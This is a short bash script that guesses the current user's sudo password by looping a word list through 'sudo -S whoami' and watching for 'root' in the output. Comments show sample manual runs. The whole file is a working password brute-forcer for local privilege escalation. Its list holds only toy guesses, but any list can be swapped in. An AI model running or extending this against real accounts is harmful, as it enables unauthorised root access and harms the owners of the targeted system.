#!/bin/bash

# This script loops through the PASSWORDS array passing each P -> password as
# --stdin to the "sudo whoami" command, then checks the resulting output for the 
# username root to discover if the sudo command was passed the correct password 
# or not. Note: It assumes that the current user is a member of the sudo or 
# wheel group and can run sudo commands if the correct password is given. 

# Manual testing
# :~$ P="one"; sudo -k && echo "$P" |sudo -S whoami
#   [sudo] password for {username}: Sorry, try again.
#   [sudo] password for {username}: 
#   sudo: no password was provided
#   sudo: 1 incorrect password attempt
# :~$ P="password123"; sudo -k && echo "$P" |sudo -S whoami
#   [sudo] password for {username}: root

PASSWORDS=(one two three password123 five)
touch /tmp/temp_file
for P in ${PASSWORDS[@]}
do
    sudo -k && echo "$P" |sudo -S whoami &>/tmp/temp_file
    if grep --quiet "root" /tmp/temp_file
    then 
        echo "$(date +'%Y-%m-%dT%T%Z') exit: $? FOUND: sudo => $P"
        break
    else 
        echo "$(date +'%Y-%m-%dT%T%Z') exit: $? TRIED: $P"
    fi
    sleep 2
done
rm /tmp/temp_file
